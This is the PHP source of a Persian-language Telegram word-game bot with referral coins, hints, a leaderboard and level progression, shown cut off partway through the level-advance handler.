<?php
flush();
ob_start();
error_reporting(0);
define('API_KEY','[*[TOKEN]*]'); //Token - 
//--------[Your Config]--------//
$Dev = ["[*[ADMIN]*]","1100991740"]; //Admin iD
$Channel = '@[*[CHANNEL]*]'; //Channel id @
$ads = file_get_contents("ads.txt");
//-----------------------------//
function bot($method, $datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$day = (2505600 - (time() - filectime('Mahdy'))) / 60 / 60 / 24;
$day = round($day, 0);
$update = json_decode(file_get_contents('php://input'));

if(isset($update->message)){
    $message = $update->message;
	$text = $message->text;
	$tc = $message->chat->type;
    $chat_id = $message->chat->id;
	$from_id = $message->from->id;
	$message_id = $message->message_id;
    $first_name = $message->from->first_name;
    $last_name = $message->from->last_name;
    $user_name = $message->from->username;
}
if(isset($update->callback_query)){
    $callback_query = $update->callback_query;
	$Data = $callback_query->data;
	$tc = $callback_query->message->chat->type;
    $chat_id = $callback_query->message->chat->id;
	$from_id = $callback_query->from->id;
	$message_id = $callback_query->message->message_id;
    $firstname = $callback_query->from->first_name;
    $lastname = $callback_query->from->last_name;
    $username = $callback_query->from->username;
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
//--------[DataBase]--------//
$wordlist = json_decode(file_get_contents("data/wordlist.json"), true);
$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
$step = $data['step'];
//-----------------------------//
$get = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$Channel&user_id=".$from_id),true);
$rank = $get['result']['status'];
//-----------------------------------------------------------------------------------------
$help = json_encode([
	'resize_keyboard'=>true,
	'inline_keyboard'=>[
	[ ['text'=>"🏵 راهنمای افزایش سکه",'callback_data'=>"coinup"],['text'=>"🎮 راهنمای بازی کردن",'callback_data'=>"play"] ],
	[ ['text'=>"💡 درباره بازی",'callback_data'=>"info"],['text'=>"🥁 راهنمای استفاده از سکه",'callback_data'=>"coinuse"] ],
	]
	]);
	
//----------------------------------//
function SendMessage($chat_id, $text, $mode = null){
return	bot('SendMessage',[
	'chat_id'=>$chat_id,
	'text'=>$text,
	'parse_mode'=>$mode
	]);
}
function Forward($berekoja, $azchejaei, $kodompayam){
	bot('ForwardMessage',[
	'chat_id'=>$berekoja,
	'from_chat_id'=>$azchejaei,
	'message_id'=>$kodompayam
	]);
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
function GetProfile($from_id){
    $get = file_get_contents('https://api.telegram.org/bot'.API_KEY.'/getUserProfilePhotos?user_id='.$from_id);
    $decode = json_decode($get,true);
    $result = $decode['result'];
    $profile = $result['photos'][0][0]['file_id'];
    return $profile;
}
if ($day <= 2){
bot('SendMessage',[
'chat_id'=>[*[ADMIN]*],
'text'=>"ادمین گرامی مدت زمان اشتراک شما در رباتساز بزرگ میا کریت ب اتمام رسیده است ⚠️
برای تمدید ربات خود به پیوی ادمین مراجعه کنید ❤️
@DevOscar 👤",
'parse_mode'=>'MarkDown',
]);
exit();
}
//-----------------------------------//
if((preg_match('/^\/(start)$/i', $text) || $text == "▫️ برگشت") and $tc == 'private'){
	$data['step'] = "none";
	file_put_contents("data/$from_id/data.json",json_encode($data));
	bot('SendMessage',[
	'chat_id'=>$chat_id,
	'text'=>"😎 سلام به ربات بازی کلمات خوش آومدی!
🙃 این بازی یه جور بازی با کلماته که مرحله های زیادی داره و با جمع آوری سکه میتونی در هر مرحله ای که هستی کمک بگیری.

📍 برای شروع بازی از کلید های زیر استفاده کن.",
	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"🎲 شروع بازی"]],
    [['text'=>"👤 اطلاعات من 👤"],['text'=>"🏆 برترین کاربران"]],
    [['text'=>"🏵 جمع آوری سکه"],['text'=>"🔸 راهنما"]],
	]
	])
	]);
}
elseif(preg_match('/^\/(start) (\d+)$/i', $text, $match) and $tc == 'private'){
	if(empty($data) === false || $from_id == $match[2]){
		$data['step'] = "none";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"😎 سلام به ربات بازی کلمات خوش آومدی!

🙃 این بازی یه جور بازی با کلماته که مرحله های زیادی داره و با جمع آوری سکه میتونی در هر مرحله ای که هستی کمک بگیری.

📍 برای شروع بازی از کلید های زیر استفاده کن.",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"🎲 شروع بازی"]],
		[['text'=>"👤 اطلاعات من 👤"],['text'=>"🏆 برترین کاربران"]],
		[['text'=>"🏵 جمع آوری سکه"],['text'=>"🔸 راهنما"]],
		]
		])
		]);
	}else{
		$data = json_decode(file_get_contents("data/".$match[2]."/data.json"), true);
		$data['step'] = "none";
		$data['coin'] += 10;
		file_put_contents("data/".$match[2]."/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"😎 سلام به ربات بازی کلمات خوش آومدی!

🙃 این بازی یه جور بازی با کلماته که مرحله های زیادی داره و با جمع آوری سکه میتونی در هر مرحله ای که هستی کمک بگیری.

📍 برای شروع بازی از کلید های زیر استفاده کن.",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"🎲 شروع بازی"]],
		[['text'=>"👤 اطلاعات من 👤"],['text'=>"🏆 برترین کاربران"]],
		[['text'=>"🏵 جمع آوری سکه"],['text'=>"🔸 راهنما"]],
		]
		])
		]);
		SendMessage($match[2], "😬 کاربر [$from_id](tg://user?id=$from_id) با لینک تو وارد ربات شد و بهت 10 سکه دادم 🙏🏻", 'MarkDown');
	}
}
elseif($rank == "left"){
	SendMessage($chat_id, "🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید \n\n$Channel   $Channel  📣\n$Channel   $Channel  📣\n\n☑️ بعد از عضویت روی /Start کلیک کنید");
}
elseif($text == "🔸 راهنما"){
	bot('SendMessage',[
	'chat_id'=>$chat_id,
	'text'=>"💡 با کلمات به یک استاد واژگان تبدیل شوید!​
فقط با زدن بر روی حروف، کلمات با معنی بسیاری بسازید و به یک استاد واژگان تبدیل شوید!
برای استاد شدن تلاش زیادی لازمه، پس وقتشه که رمز و رموز موجود در کلمات را بیابید و ذهن خود را چندین برابر ارتقا دهید.

📌 ویژگی های کلمات :
- ساده، آسان و گیم پلی اعتیاد آور!
- هر روز یک چالش جدید تجربه کنید!
- از اعضای خانواده و دوستان خود برای کمک به یکدیگر بپرسید!
- جمع آوری سکه از طریق دعوت دوستان
- مشاهده برترین کاربران (لِوِل بالاترین ها)
- مشاهده رتبه جهانی شما بین کل کاربران ربات

💬 کلمات یک بازی طراحی شده برای آموزش مغز و یادگیری کلمات جدید است که در هر زمان و مکان میتوان بازی کرد. با اشتراک گذاری کلمات همه از این بازی لذت ببریم و به رشد هم کمک کنیم.

‼️ توجه : این بازی هیچ ارتباطی به بازی اصلی `کلمات نسخه اندروید` موجود در مارکت های ایرانی ندارد و فقط الگوبرداری شده است!",
	'parse_mode'=>'MarkDown',
	'reply_markup'=>$help
	]);
}
elseif(in_array($Data, ["coinup","play","info","coinuse"])){
	if($Data == "coinup"){
		$helpmsg = "📍 راه های بالا بردن سکه 

🔸 شما پس از عبور کردن از هر مرحله با موفقیت ، 9 سکه دریافت می کنید.
🔸 روش مرسوم و پیشنهادی ما روش زیرمجموعه گیری است که شما با زدن روی دکمه `'🏵 جمع آوری سکه'` بنر مخصوص خود را دریافت می کنید و با انتشار بنر مخصوص تان بین دوستان و آشنایان در گروه ها و شخصی افراد ، نسبت به جمع آوری زیرمجموعه اقدام می کنید و با عضو شدن هر زیرمجموعه از طرف شما ، به شما 10 سکه تعلق می گیرد.
🔸 روش سوم بالا بردن سکه توسط خریداری سکه توسط درگاه بانکی می باشد که به زودی این قسمت فعال می گردد .";
	}
	elseif($Data == "play"){
		$helpmsg = "📍 راهنمای بازی کردن :

ابتدا روی دکمه `'🎲 شروع بازی'` بزنید.
خب اکنون مرحله ای که در آن حاضر هستید شناسایی و باز می شود.
بالای پیام تعداد کلمات مراحل و مرحله فعلی شما ذکر شده است.
عبارات حل نشده به صورت ⭕️ نمایش داده می شوند و هر ⭕️ به معنای یک کاراکتر است!
از کلمات تعبیه شده به صورت شیشه ای در پایین، شما باید کلمات مجهول را بیابید و متن شما رو به روی قسمت ( >> نوشته شما ) به صورت زنده قابل مشاهده است.
در هر جا شما با استفاده از دکمه '✖️ یک حذف' می توانید یک حرف را از نوشته فعلی تان حذف و درصورت تمایل به حذف کامل متن شما از کلید `'🗑 حذف کامل نوشته من'` بهره مند شوید.
اکنون پس از نوشتن کلمه فرضیه ای شما روی دکمه `'🔄 برسی کلمه نوشته شده'` بزنید و نتیجه را مشاهده کنید.
اگر کلمه فرضیه ای (حدسی) شما درست باشد پس از نمایش پیغام موفقیت ، به صورت خودکار جایگزین ⭕️ ها در متن می شود.
پس از حل کامل کلمات مرحله روی دکمه `'😎 بریم مرحله بعدی'` بزنید تا سیستم برسی کند ، اگر تمامی کلمات پاسخ داده شده باشند شما به مرحله بعد راه پیدا می کنید در غیر اینصورت پیغامی مبنی بر کامل نبودن کلمات مشاهده خواهید کرد.";
	}
	elseif($Data == "info"){
		$helpmsg = "💡 با کلمات به یک استاد واژگان تبدیل شوید!​
فقط با زدن بر روی حروف، کلمات با معنی بسیاری بسازید و به یک استاد واژگان تبدیل شوید!
برای استاد شدن تلاش زیادی لازمه، پس وقتشه که رمز و رموز موجود در کلمات را بیابید و ذهن خود را چندین برابر ارتقا دهید.

📌 ویژگی های کلمات :
- ساده، آسان و گیم پلی اعتیاد آور!
- هر روز یک چالش جدید تجربه کنید!
- از اعضای خانواده و دوستان خود برای کمک به یکدیگر بپرسید!
- جمع آوری سکه از طریق دعوت دوستان
- مشاهده برترین کاربران (لِوِل بالاترین ها)
- مشاهده رتبه جهانی شما بین کل کاربران ربات

💬 کلمات یک بازی طراحی شده برای آموزش مغز و یادگیری کلمات جدید است که در هر زمان و مکان میتوان بازی کرد. با اشتراک گذاری کلمات همه از این بازی لذت ببریم و به رشد هم کمک کنیم.

‼️ توجه : این بازی هیچ ارتباطی به بازی اصلی `کلمات نسخه اندروید` موجود در مارکت های ایرانی ندارد و فقط الگوبرداری شده است!";
	}
	elseif($Data == "coinuse"){
		$helpmsg = "📍 آموزش استفاده از سکه ها

🤔 شما درحین بازی اگر جایی رو گیر کردید و نتونستید از اون عبور کنید می تونید از کلید های :
`'💡 یک حرف | 10 سکه'`  (مشاهده یک حرف از حروف کلمه ای که شما در آن گیر کردید)
`'💡 یک کلمه کامل | 25 سکه'`  (مشاهده کامل کلمه ای که شما در آن گیر کردید)
استفاده کنید !";
	}
	bot('editMessageText',[
		'chat_id'=>$chat_id,
		'text'=>$helpmsg,
		'parse_mode'=>'MarkDown',
		'message_id'=>$message_id,
		'reply_markup'=>$help
		]); exit();
}
elseif($text == "👤 اطلاعات من 👤"){
    $coin = $data['coin'];
	$level = $data['level'];
	$esm = $data['esm'];
	if($level - 2 == count($wordlist) - 1){
	    $level .= " (مرحله آخر)";
	}
    $newArray = [];
	foreach(scandir("data") as $key => $value){
		$data = json_decode(file_get_contents("data/$value/data.json"), true);
		if(is_numeric($value)){
		    $newArray[$value] = $data['level'];
		}
	}
	arsort($newArray);
	$grate = $newArray[$from_id];
	$newArray = array_values($newArray);
	$grate = array_search($grate, $newArray) + 1;
	bot('sendPhoto',[
	'chat_id'=>$chat_id,
	'photo'=>(string) GetProfile($from_id),
	'caption'=>"📍 اطلاعات شما :
	
👤 اسم شما در بازی : $esm

🏵 سکه های شما : *$coin*

🔹 مرحله : *$level*

🌐 رتبه جهانی شما : *$grate*",
	'parse_mode'=>'MarkDown',
	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'inline_keyboard'=>[
	[['text'=>"✏️ تغییر نام من در بازی",'callback_data'=>"rename"]]
	]
	])
	]);
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
elseif($Data == "rename"){
	$data['step'] = "rename";
	file_put_contents("data/$from_id/data.json",json_encode($data));
	SendMessage($chat_id, "✏️ نام جدید خود را ارسال کنید :\nدرصورت تمایل به انصراف /start");
}
elseif($step == "rename" and isset($text)){
	$data['esm'] = $text;
	$data['step'] = "none";
	file_put_contents("data/$from_id/data.json",json_encode($data));
	SendMessage($chat_id, "✅ نام شما به [$text] در بازی تغییر یافت.");
}
elseif($text == "🏆 برترین کاربران"){
	$newArray = [];
	foreach(scandir("data") as $key => $value){
		$data = json_decode(file_get_contents("data/$value/data.json"), true);
		if(is_numeric($value)){
		    $newArray[$value] = $data['level'];
		}
	}
	arsort($newArray);
	$i = 0;
	foreach($newArray as $key => $value){
	    if($i < 10){
			$data = json_decode(file_get_contents("data/$key/data.json"), true);
			$name = $data['esm'];
			$name = str_replace(["[","*","`","_","]"], "\t", $name);
			if($key == $from_id){
				$string .= "👤 [$name](tg://user?id=$key)\n🔮 *You : $value*".PHP_EOL.PHP_EOL;
			}else{
				$string .= "👤 [$name](tg://user?id=$key)\n🔮 *$value*".PHP_EOL.PHP_EOL;
			}
	        $i++;
	    }else{
	        break;
	    }
	}
	$get = json_decode(file_get_contents("https://api.novateamco.ir/time"), true);
	$date = $get['date'];
	$today = $get['today'];
	SendMessage($chat_id, "🏆 لیست برترین کاربران ربات از نظر مرحله ،\n آپدیت شده در روز *($today)* تاریخ *($date)* :\n\n$string", 'MarkDown');
}
elseif($text == "🏵 جمع آوری سکه"){
	$BotID = bot('getMe') -> result -> username;
	bot('SendPhoto',[
	'chat_id'=>$chat_id,
	'photo'=>"https://tlgur.com/d/g0yneM34",
	'caption'=>"🎮 ربات بازی کلمات (بازی با کلمات)

😅 رمز و رموز موجود در کلمات را بیابید و ذهن خود را چندین برابر ارتقا دهید.

🙃 قابلیت مشاهده سطح جهانی شما بین کل کاربران

👉🏻 https://T.me/$BotID?start=$from_id"
	]);
	SendMessage($chat_id, "📍 بنر بالا حاوی لینک شخصی شماست بنر را برای دوستان و گروه های خود ارسال کنید و با عضویت هر یک زیرمجموعه ، ده سکه دریافت کنید.
➖➖
🌱 برای اطلاع از سکه های فعلی تان از دکمه `'👤 اطلاعات من 👤'` استفاده کنید.

🌚 به یاد داشته باشید ، به محض عضو شدن شخصی از طریق لینک شما ، به شما اطلاع داده خواهد شد و سکه جایزه شما آنی بر روی حساب شما اعمال خواهد شد.", 'MarkDown');
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
//--------[Start Game]--------//
elseif($text == "🎲 شروع بازی"){
	$level = $data['level'];
	if(isset($wordlist[$level - 1])){
		$msg = SendMessage($chat_id, "🔹 ربات درحال بارگذاری می باشد ...\n💡 لطفاَ منتظر باشید !", 'MarkDown');
		sleep(1);
		for($i = 0; $i <= 5; $i++){
			bot('editMessageText',[
			'chat_id'=>$chat_id,
			'text'=>"🔄 درحال پردازش اطلاعات مراحل ...".PHP_EOL.str_repeat("▪️", $i),
			'parse_mode'=>'MarkDown',
			'message_id'=>$msg -> result -> message_id,
			]);
		}
		bot('deleteMessage',[
		'chat_id'=>$chat_id,
		'message_id'=>$msg -> result -> message_id,
		]);
		unset($data['text']);
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
		$level = $data['level'];
		$words = $wordlist[$level - 1];
		$cword = count($words);
		$ytext = isset($data['text']) ? $data['text'] : "`هنوز هیچی وارد نکردی!`";
		//----------------------------------------
		foreach($words as $value){
			$slp = preg_split('//u', $value, null, PREG_SPLIT_NO_EMPTY);
			foreach($slp as $value1){
				$newArray[] = $value1;
			}
			$len = mb_strlen($value, 'UTF-8');
			$v = str_repeat("⭕️", $len);
			if(isset($data['datalevel']) and strstr($data['datalevel'], "📍")){
				$string = $data['datalevel'];
			}else{
				$string .= "📍 $v".PHP_EOL;
			}
		}
		$data['datalevel'] = $string;
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
		$newArray = array_unique($newArray);
		sort($newArray);
		foreach($newArray as $key => $value){
			$keyboard[floor($key / 4)][$key % 4] =  ['text'=>$value,'callback_data'=>$value];
		}
		//----------------------------------------
		$keyboard[] = [ ['text'=>"🗑 حذف کامل نوشته من",'callback_data'=>"clean"],['text'=>"✖️ یک حذف",'callback_data'=>"del"] ];
		$keyboard[] = [ ['text'=>"💡 یک کلمه کامل | 25 سکه",'callback_data'=>"oneanswer"],['text'=>"💡 یک حرف | 10 سکه",'callback_data'=>"onew"] ];
		$keyboard[] = [ ['text'=>"🔄 برسی کلمه نوشته شده",'callback_data'=>"check"] ];
		$keyboard[] = [ ['text'=>"😎 بریم مرحله بعدی",'callback_data'=>"nextlevel"] ];
		
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"🔮 مرحله : *$level* | 📚 تعداد کلمات : *$cword*
➖➖➖➖➖➖➖➖➖
>> نوشته شما : $ytext

عبارات :
$string
➖➖➖➖➖➖➖➖➖
$ads",
		'parse_mode'=>'MarkDown',
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'inline_keyboard'=>
		(array) $keyboard
		])
		]);
	}else{
		SendMessage($chat_id, "😳 شما بازی رو تموم کردی و مرحله آخر هم تموم شد.
🤓 اما نگران نباش چون قراره مرحله های جدید قرار بگیره ، هروقت مرحله های جدید رو گذاشتیم من بهت اطلاع میدم تا بتونی بازم بازی کنی!", 'MarkDown');
		unset($data['text']);
		unset($data['datalevel']);
		file_put_contents("data/$from_id/data.json",json_encode($data));
	}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
if(isset($Data)){
	if($Data == "del"){
		$data['text'] = mb_substr($data['text'], 0, -1, 'UTF-8');
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
		$level = $data['level'];
		$words = $wordlist[$level - 1];
		$cword = count($words);
		$ytext = !empty($data['text']) ? $data['text'] : "`هنوز هیچی وارد نکردی!`";
		//----------------------------------------
		foreach($words as $value){
			$slp = preg_split('//u', $value, null, PREG_SPLIT_NO_EMPTY);
			foreach($slp as $value1){
				$newArray[] = $value1;
			}
			$len = mb_strlen($value, 'UTF-8');
			$v = str_repeat("⭕️", $len);
			if(isset($data['datalevel']) and strstr($data['datalevel'], "📍")){
				$string = $data['datalevel'];
			}else{
				$string .= "📍 $v".PHP_EOL;
			}
		}
		$data['datalevel'] = $string;
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
		$newArray = array_unique($newArray);
        sort($newArray);
        foreach($newArray as $key => $value){
            $keyboard[floor($key / 4)][$key % 4] =  ['text'=>$value,'callback_data'=>$value];
        }
		//----------------------------------------
		$keyboard[] = [ ['text'=>"🗑 حذف کامل نوشته من",'callback_data'=>"clean"],['text'=>"✖️ یک حذف",'callback_data'=>"del"] ];
		$keyboard[] = [ ['text'=>"💡 یک کلمه کامل | 25 سکه",'callback_data'=>"oneanswer"],['text'=>"💡 یک حرف | 10 سکه",'callback_data'=>"onew"] ];
		$keyboard[] = [ ['text'=>"🔄 برسی کلمه نوشته شده",'callback_data'=>"check"] ];
		$keyboard[] = [ ['text'=>"😎 بریم مرحله بعدی",'callback_data'=>"nextlevel"] ];
		bot('editMessageText',[
		'chat_id'=>$chat_id,
		'text'=>"🔮 مرحله : *$level* | 📚 تعداد کلمات : *$cword*
➖➖➖➖➖➖➖➖➖
>> نوشته شما : $ytext

عبارات :
$string
➖➖➖➖➖➖➖➖➖
$ads",
		'parse_mode'=>'MarkDown',
		'message_id'=>$message_id,
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'inline_keyboard'=>
		(array) $keyboard
		])
		]);
	}
	elseif($Data == "clean"){
		unset($data['text']);
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
		$level = $data['level'];
		$words = $wordlist[$level - 1];
		$cword = count($words);
		$ytext = isset($data['text']) ? $data['text'] : "`هنوز هیچی وارد نکردی!`";
		//----------------------------------------
		foreach($words as $value){
			$slp = preg_split('//u', $value, null, PREG_SPLIT_NO_EMPTY);
			foreach($slp as $value1){
				$newArray[] = $value1;
			}
			$len = mb_strlen($value, 'UTF-8');
			$v = str_repeat("⭕️", $len);
			if(isset($data['datalevel']) and strstr($data['datalevel'], "📍")){
				$string = $data['datalevel'];
			}else{
				$string .= "📍 $v".PHP_EOL;
			}
		}
		$data['datalevel'] = $string;
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
		$newArray = array_unique($newArray);
		sort($newArray);
        foreach($newArray as $key => $value){
            $keyboard[floor($key / 4)][$key % 4] =  ['text'=>$value,'callback_data'=>$value];
        }
		//----------------------------------------
		$keyboard[] = [ ['text'=>"🗑 حذف کامل نوشته من",'callback_data'=>"clean"],['text'=>"✖️ یک حذف",'callback_data'=>"del"] ];
		$keyboard[] = [ ['text'=>"💡 یک کلمه کامل | 25 سکه",'callback_data'=>"oneanswer"],['text'=>"💡 یک حرف | 10 سکه",'callback_data'=>"onew"] ];
		$keyboard[] = [ ['text'=>"🔄 برسی کلمه نوشته شده",'callback_data'=>"check"] ];
		$keyboard[] = [ ['text'=>"😎 بریم مرحله بعدی",'callback_data'=>"nextlevel"] ];
		bot('editMessageText',[
		'chat_id'=>$chat_id,
		'text'=>"🔮 مرحله : *$level* | 📚 تعداد کلمات : *$cword*
➖➖➖➖➖➖➖➖➖
>> نوشته شما : $ytext

عبارات :
$string
➖➖➖➖➖➖➖➖➖
$ads",
		'parse_mode'=>'MarkDown',
		'message_id'=>$message_id,
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'inline_keyboard'=>
		(array) $keyboard
		])
		]);
	}
	elseif($Data == "check"){
		$ytext = $data['text'];
		$level = $data['level'];
		if(empty($ytext) === false){
			if(in_array($ytext, $wordlist[$level - 1])){
				$Len = mb_strlen($ytext, 'UTF-8');
				$string = preg_replace('/(⭕️){'.$Len.'}/su', $ytext, $data['datalevel'], 1);
				if(strstr($data['datalevel'], $ytext)){
				    bot('answerCallbackQuery',[
				    'callback_query_id'=>$callback_query->id,
				    'text'=>"📍اینو از قبل وارد کردی .",
				    'show_alert'=>true
				    ]);
				   exit(); 
				}else{
				    bot('answerCallbackQuery',[
				    'callback_query_id'=>$callback_query->id,
				    'text'=>"🎉 آفرین ، درست وارد کردی.",
				    'show_alert'=>true
				    ]);
				}
				$level = $data['level'];
				$words = $wordlist[$level - 1];
				$cword = count($words);
				unset($data['text']);
				$ytext = isset($data['text']) ? $data['text'] : "`هنوز هیچی وارد نکردی!`";
				//----------------------------------------
				$data['datalevel'] = $string;
				file_put_contents("data/$from_id/data.json",json_encode($data));
				$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
				foreach($words as $value){
					$slp = preg_split('//u', $value, null, PREG_SPLIT_NO_EMPTY);
					foreach($slp as $value1){
						$newArray[] = $value1;
					}
				}
				$newArray = array_unique($newArray);
				sort($newArray);
				foreach($newArray as $key => $value){
					$keyboard[floor($key / 4)][$key % 4] =  ['text'=>$value,'callback_data'=>$value];
				}
				//----------------------------------------
				$keyboard[] = [ ['text'=>"🗑 حذف کامل نوشته من",'callback_data'=>"clean"],['text'=>"✖️ یک حذف",'callback_data'=>"del"] ];
				$keyboard[] = [ ['text'=>"💡 یک کلمه کامل | 25 سکه",'callback_data'=>"oneanswer"],['text'=>"💡 یک حرف | 10 سکه",'callback_data'=>"onew"] ];
				$keyboard[] = [ ['text'=>"🔄 برسی کلمه نوشته شده",'callback_data'=>"check"] ];
				$keyboard[] = [ ['text'=>"😎 بریم مرحله بعدی",'callback_data'=>"nextlevel"] ];
				bot('editMessageText',[
				'chat_id'=>$chat_id,
				'text'=>"🔮 مرحله : *$level* | 📚 تعداد کلمات : *$cword*
➖➖➖➖➖➖➖➖➖
>> نوشته شما : $ytext

عبارات :
$string
➖➖➖➖➖➖➖➖➖
$ads",
				'parse_mode'=>'MarkDown',
				'message_id'=>$message_id,
				'reply_markup'=>json_encode([
				'resize_keyboard'=>true,
				'inline_keyboard'=>
				(array) $keyboard
				])
				]);
			}else{
				bot('answerCallbackQuery',[
				'callback_query_id'=>$callback_query->id,
				'text'=>"❌ متاسفم ، اشتباه بود!",
				'show_alert'=>true
				]);
			}
		}else{
			bot('answerCallbackQuery',[
			'callback_query_id'=>$callback_query->id,
			'text'=>"😐 هیچی وارد نشده!",
			'show_alert'=>true
			]);
		}
	}
	elseif($Data == "oneanswer" || $Data == "onew"){
		if($Data == "oneanswer"){
			if($data['coin'] >= 25){
				$level = $data['level'];
				$ex = explode("\n", $data['datalevel']);
				foreach($ex as $key => $value){
					if(strstr($ex[$key], "⭕️")){
						$kelid = $key;
						break;
					}
				}
				$kalame = $wordlist[$level - 1][$kelid];
				$n = $kelid + 1;
				if(is_numeric($n) and empty($kalame) === false){
					bot('answerCallbackQuery',[
					'callback_query_id'=>$callback_query->id,
					'text'=>"📍 کلمه شماره $n می شود : $kalame",
					'show_alert'=>true
					]);
					$data['coin'] -= 25;
					file_put_contents("data/$from_id/data.json",json_encode($data));
				}else{
					bot('answerCallbackQuery',[
					'callback_query_id'=>$callback_query->id,
					'text'=>"❗️ خطا ، ممکن است به همه کلمات پاسخ داده باشید.",
					'show_alert'=>true
					]);
				}
			}else{
				$coin = 25 - $data['coin'];
				bot('answerCallbackQuery',[
				'callback_query_id'=>$callback_query->id,
				'text'=>"❗️ سکه های شما کافی نیست !\n🏵 شما باید $coin سکه دیگر داشته باشید.",
				'show_alert'=>true
				]);
			}
		}
		elseif($Data == "onew"){
			if($data['coin'] >= 10){
				$level = $data['level'];
				$ex = explode("\n", $data['datalevel']);
				foreach($ex as $key => $value){
					if(strstr($ex[$key], "⭕️")){
						$kelid = $key;
						break;
					}
				}
				$kalame = mb_substr($wordlist[$level - 1][$kelid], 0, 1, 'UTF-8');
				$n = $kelid + 1;
				if(is_numeric($n) and empty($kalame) === false){
					bot('answerCallbackQuery',[
					'callback_query_id'=>$callback_query->id,
					'text'=>"📍 کلمه شماره $n حرف اولش '$kalame' است!",
					'show_alert'=>true
					]);
					$data['coin'] -= 10;
					file_put_contents("data/$from_id/data.json",json_encode($data));
				}else{
					bot('answerCallbackQuery',[
					'callback_query_id'=>$callback_query->id,
					'text'=>"❗️ خطا ، ممکن است به همه کلمات پاسخ داده باشید.",
					'show_alert'=>true
					]);
				}
			}else{
				$coin = 10 - $data['coin'];
				bot('answerCallbackQuery',[
				'callback_query_id'=>$callback_query->id,
				'text'=>"❗️ سکه های شما کافی نیست !\n🏵 شما باید $coin سکه دیگر داشته باشید.",
				'show_alert'=>true
				]);
			}
		}
	}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
	elseif($Data == "nextlevel"){
		if(! mb_strstr($data['datalevel'], "⭕️", false, 'UTF-8')){
			$level = $data['level'];
			if(isset($wordlist[$level])){
				#Next Level
				bot('answerCallbackQuery',[
				'callback_query_id'=>$callback_query->id,
				'text'=>"😃 با موفقیت مرحله ".$data['level']." رو پشت سر گذاشتی و 9 سکه گرفتی!

👈🏻 تا 3 ثانیه دیگر به صورت خودکار مرحله بعدی آغاز می شود ...",
				'show_alert'=>true
				]);
				bot('deleteMessage',[
				'chat_id'=>$chat_id,
				'message_id'=>$message_id
				]);
				unset($data['text']);
				unset($data['datalevel']);
				$data['level'] += 1;
				$data['coin'] += 9;
				file_put_contents("data/$from_id/data.json",json_encode($data));
				$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
				$level = $data['level'];
				$words = $wordlist[$level - 1];
				$cword = count($words);
				$ytext = isset($data['text']) ? $data['text'] : "`هنوز هیچی وارد نکردی!`";
				//----------------------------------------
				foreach($words as $value){
					$slp = preg_split('//u', $value, null, PREG_SPLIT_NO_EMPTY);
					foreach($slp as $value1){
						$newArray[] = $value1;
					}
					$len = mb_strlen($value, 'UTF-8');
					$v = str_repeat("⭕️", $len);
					if(isset($data['datalevel']) and strstr($data['datalevel'], "📍")){
						$string = $data['datalevel'];
					}else{
						$string .= "📍 $v".PHP_EOL;
					}
				}
				$data['datalevel'] = $string;
				file_put_contents("data/$from_id/data.json",json_encode($data));
				$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
				$newArray = array_unique($newArray);
				sort($newArray);
				foreach($newArray as $key => $value){
					$keyboard[floor($key / 4)][$key % 4] =  ['text'=>$value,'callback_data'=>$value];
				}
				//----------------------------------------
				$keyboard[] = [ ['text'=>"🗑 حذف کامل نوشته من",'callback_data'=>"clean"],['text'=>"✖️ یک حذف",'callback_data'=>"del"] ];
